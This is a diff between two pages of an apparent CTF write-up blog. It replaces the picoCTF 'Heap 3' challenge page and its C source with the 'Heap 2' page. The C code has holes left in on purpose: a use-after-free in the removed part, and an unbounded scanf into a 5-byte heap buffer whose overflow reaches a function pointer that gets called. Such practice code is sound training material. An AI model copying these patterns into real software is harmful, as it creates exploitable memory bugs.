@@ -1,4 +1,4 @@
-<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.4e6b4b48bb8ccc7349085619f93c7c6bd89cf646c4dfb11ae55b636f7c8a48695035d5dd83177ac1214dfa3370cd16c95cd889f55df04b6764c9e554d714aa6b.css" integrity="sha512-TmtLSLuMzHNJCFYZ+Tx8a9ic9kbE37Ea5Vtjb3yKSGlQNdXdgxd6wSFN+jNwzRbJXNiJ9V3wS2dkyeVU1xSqaw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/ctf/pico/heap3/><title>Heap 3 | d3bo</title><meta name=description content><meta property="og:title" content="Heap 3"><meta property="og:description" content="#include <stdio.h> #include <stdlib.h> #include <string.h> #define FLAGSIZE_MAX 64 // Create struct typedef struct { char a[10]; char b[10]; char c[10]; char flag[5]; } object; int num_allocs; object *x; void check_win() { if(!"><meta property="og:type" content="article"><meta property="og:url" content="/ctf/pico/heap3/"><meta property="og:image" content="/ctf/pico/heap3/cover.png"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-07-14T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-14T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/ctf/pico/heap3/cover.png"><meta name=twitter:title content="Heap 3"><meta name=twitter:description content="#include <stdio.h> #include <stdlib.h> #include <string.h> #define FLAGSIZE_MAX 64 // Create struct typedef struct { char a[10]; char b[10]; char c[10]; char flag[5]; } object; int num_allocs; object *x; void check_win() { if(!"><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/ctf/","name":"Ctf's","position":2},{"@type":"ListItem","item":"/ctf/pico/","name":"Pico Ctf","position":3},{"@type":"ListItem","name":"Heap 3","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1877012045454778" crossorigin=anonymous></script>
+<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.4e6b4b48bb8ccc7349085619f93c7c6bd89cf646c4dfb11ae55b636f7c8a48695035d5dd83177ac1214dfa3370cd16c95cd889f55df04b6764c9e554d714aa6b.css" integrity="sha512-TmtLSLuMzHNJCFYZ+Tx8a9ic9kbE37Ea5Vtjb3yKSGlQNdXdgxd6wSFN+jNwzRbJXNiJ9V3wS2dkyeVU1xSqaw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=canonical href=/ctf/pico/heap2/><title>Heap 2 | d3bo</title><meta name=description content><meta property="og:title" content="Heap 2"><meta property="og:description" content="#include <stdio.h> #include <stdlib.h> #include <string.h> #define FLAGSIZE_MAX 64 int num_allocs; char *x; char *input_data; void win() { // Print flag char buf[FLAGSIZE_MAX]; FILE *fd = fopen(&#34;flag."><meta property="og:type" content="article"><meta property="og:url" content="/ctf/pico/heap2/"><meta property="og:image" content="/ctf/pico/heap2/cover.png"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-08-07T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-07T00:00:00+00:00"><meta property="og:site_name" content="d3b0o"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/ctf/pico/heap2/cover.png"><meta name=twitter:title content="Heap 2"><meta name=twitter:description content="#include <stdio.h> #include <stdlib.h> #include <string.h> #define FLAGSIZE_MAX 64 int num_allocs; char *x; char *input_data; void win() { // Print flag char buf[FLAGSIZE_MAX]; FILE *fd = fopen(&#34;flag."><meta name=twitter:site content="@getdoks"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3bo","position":1},{"@type":"ListItem","item":"/ctf/","name":"Ctf's","position":2},{"@type":"ListItem","item":"/ctf/pico/","name":"Pico Ctf","position":3},{"@type":"ListItem","name":"Heap 2","position":4}]}</script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1877012045454778" crossorigin=anonymous></script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-850CS210Y8"></script>
 <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-850CS210Y8")</script></head><body class="single section ctf" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=vanta-bg style=position:absolute;width:100%;height:100%;z-index:-1></div><div id=announcement data-id=global-alert-ed321576fabf52d76f925272710cb364 class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/hackthebox/unobtainium>Unobtainium</a>" de HackTheBox!</span>
 <button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-lg><a class="navbar-brand me-auto me-lg-3" href=/>d3bo</a>
@@ -38,8 +38,8 @@ Format strings 3</a></li><li style=display:flex;align-items:center;gap:.5rem><a 
 Guessing Game 1</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/guessing-game-2/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Guessing Game 2</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap0/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Heap 0</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap1/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
-Heap 1</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap2/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
-Heap 2</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded active" href=/ctf/pico/heap3/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
+Heap 1</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded active" href=/ctf/pico/heap2/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
+Heap 2</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap3/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Heap 3</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heres_a_libc/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Here's a LIBC</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/hijacking/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Hijacking</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/pickeriv/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
@@ -90,8 +90,8 @@ Format strings 3</a></li><li style=display:flex;align-items:center;gap:.5rem><a 
 Guessing Game 1</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/guessing-game-2/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Guessing Game 2</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap0/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Heap 0</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap1/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
-Heap 1</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap2/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
-Heap 2</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded active" href=/ctf/pico/heap3/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
+Heap 1</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded active" href=/ctf/pico/heap2/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
+Heap 2</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heap3/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Heap 3</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/heres_a_libc/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Here's a LIBC</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/hijacking/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 Hijacking</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/pickeriv/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
@@ -106,28 +106,18 @@ two-sum</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="do
 Unsubscriptions Are Free</a></li><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/pico/vne/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
 VNE</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ebcf50f78baf4379b14028a2740992de aria-expanded=false>
 WWCTF</button><div class=collapse id=section-ebcf50f78baf4379b14028a2740992de><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:center;gap:.5rem><a class="docs-link rounded" href=/ctf/wwctf/affirmationbot/><img src=/blog/phishing/images/pwn.png alt=pwn style=width:20px;height:auto>
-Affirmation Bot</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/ctf/>Ctf</a></li><li class=breadcrumb-item><a href=/ctf/pico/>PicoCTF</a></li><li class="breadcrumb-item active" aria-current=page>Heap 3</li></ol></nav><div style=display:flex;align-items:center><h1 style=margin:0;vertical-align:middle>Heap 3</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"></nav><div class=mb-4><div class="d-flex align-items-center mb-2"><img src=/blog/phishing/images/pico.png alt=pico style=width:50px;height:50px;border-radius:50%;margin-right:10px><div class="d-flex align-items-center me-4"><span></span>
-<span class="badge bg-secondary me-1">pwn</span></div></div><div class="d-flex flex-wrap"><a class="btn btn-light me-2 mb-2" href=/tags/uaf/ role=button>UAF</a></div></div><p><small>July 14, 2025<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>3&nbsp;minutes</span></small></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+Affirmation Bot</a></li></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/ctf/>Ctf</a></li><li class=breadcrumb-item><a href=/ctf/pico/>PicoCTF</a></li><li class="breadcrumb-item active" aria-current=page>Heap 2</li></ol></nav><div style=display:flex;align-items:center><h1 style=margin:0;vertical-align:middle>Heap 2</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"></nav><div class=mb-4><div class="d-flex align-items-center mb-2"><img src=/blog/phishing/images/pico.png alt=pico style=width:50px;height:50px;border-radius:50%;margin-right:10px><div class="d-flex align-items-center me-4"><span></span>
+<span class="badge bg-secondary me-1">pwn</span></div></div><div class="d-flex flex-wrap"></div></div><p><small>August 7, 2025<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>4&nbsp;minutes</span></small></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp></span>
 </span></span><span class=line><span class=cl><span class=cp>#define FLAGSIZE_MAX 64
 </span></span></span><span class=line><span class=cl><span class=cp></span>
-</span></span><span class=line><span class=cl><span class=c1>// Create struct
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=k>struct</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>a</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>b</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>c</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span>
-</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>object</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>num_allocs</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=n>object</span> <span class=o>*</span><span class=n>x</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>x</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>input_data</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>check_win</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>x</span><span class=o>-&gt;</span><span class=n>flag</span><span class=p>,</span> <span class=s>&#34;pico&#34;</span><span class=p>))</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;YOU WIN!!11!!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win</span><span class=p>()</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl>    <span class=c1>// Print flag
 </span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>FLAGSIZE_MAX</span><span class=p>];</span>
 </span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
@@ -136,50 +126,39 @@ Affirmation Bot</a></li></ul></div></li></ul></nav></div><nav class="docs-toc do
 </span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;No flage for u :(</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>  <span class=p>}</span>
-</span></span><span class=line><span class=cl>  <span class=c1>// Call function in struct
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>check_win</span><span class=p>()</span> <span class=p>{</span> <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=o>*</span><span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=n>x</span><span class=p>)();</span> <span class=p>}</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_menu</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>1. Print Heap</span><span class=se>\n</span><span class=s>2. Allocate object</span><span class=se>\n</span><span class=s>3. Print x-&gt;flag</span><span class=se>\n</span><span class=s>4. Check for win</span><span class=se>\n</span><span class=s>5. Free x</span><span class=se>\n</span><span class=s>6. &#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>1. Print Heap</span><span class=se>\n</span><span class=s>2. Write to buffer</span><span class=se>\n</span><span class=s>3. Print x</span><span class=se>\n</span><span class=s>4. Print Flag</span><span class=se>\n</span><span class=s>5. &#34;</span>
 </span></span><span class=line><span class=cl>           <span class=s>&#34;Exit</span><span class=se>\n\n</span><span class=s>Enter your choice: &#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1>// Create a struct
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>init</span><span class=p>()</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>freed but still in use</span><span class=se>\n</span><span class=s>now memory untracked</span><span class=se>\n</span><span class=s>do you smell the bug?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>I have a function, I sometimes like to call it, maybe you should change it</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>object</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>x</span><span class=o>-&gt;</span><span class=n>flag</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>input_data</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>input_data</span><span class=p>,</span> <span class=s>&#34;pico&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>strncpy</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=s>&#34;bico&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>alloc_object</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Size of object allocation: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>write_buffer</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Data for buffer: &#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>size</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>alloc</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Data for flag: &#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>alloc</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>free_memory</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>input_data</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_heap</span><span class=p>()</span> <span class=p>{</span>
 </span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*]   Address   -&gt;   Value   </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;+-------------+-----------+</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*]   %p  -&gt;   %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>x</span><span class=o>-&gt;</span><span class=n>flag</span><span class=p>,</span> <span class=n>x</span><span class=o>-&gt;</span><span class=n>flag</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*]   %p  -&gt;   %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>input_data</span><span class=p>,</span> <span class=n>input_data</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;+-------------+-----------+</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*]   %p  -&gt;   %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>x</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
 </span></span><span class=line><span class=cl>
@@ -200,11 +179,11 @@ Affirmation Bot</a></li></ul></div></li></ul></nav></div><nav class="docs-toc do
 </span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>print_heap</span><span class=p>();</span>
 </span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
-</span></span><span class=line><span class=cl>            <span class=nf>alloc_object</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>            <span class=nf>write_buffer</span><span class=p>();</span>
 </span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
 </span></span><span class=line><span class=cl>            <span class=c1>// print x
-</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>x = %s</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>x</span><span class=o>-&gt;</span><span class=n>flag</span><span class=p>);</span>
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>x = %s</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>x</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>            <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>4</span><span class=o>:</span>
@@ -212,9 +191,6 @@ Affirmation Bot</a></li></ul></div></li></ul></nav></div><nav class="docs-toc do
 </span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>check_win</span><span class=p>();</span>
 </span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>5</span><span class=o>:</span>
-</span></span><span class=line><span class=cl>            <span class=nf>free_memory</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=mi>6</span><span class=o>:</span>
 </span></span><span class=line><span class=cl>            <span class=c1>// exit
 </span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>        <span class=k>default</span><span class=o>:</span>
@@ -223,21 +199,140 @@ Affirmation Bot</a></li></ul></div></li></ul></nav></div><nav class="docs-toc do
 </span></span><span class=line><span class=cl>        <span class=p>}</span>
 </span></span><span class=line><span class=cl>    <span class=p>}</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
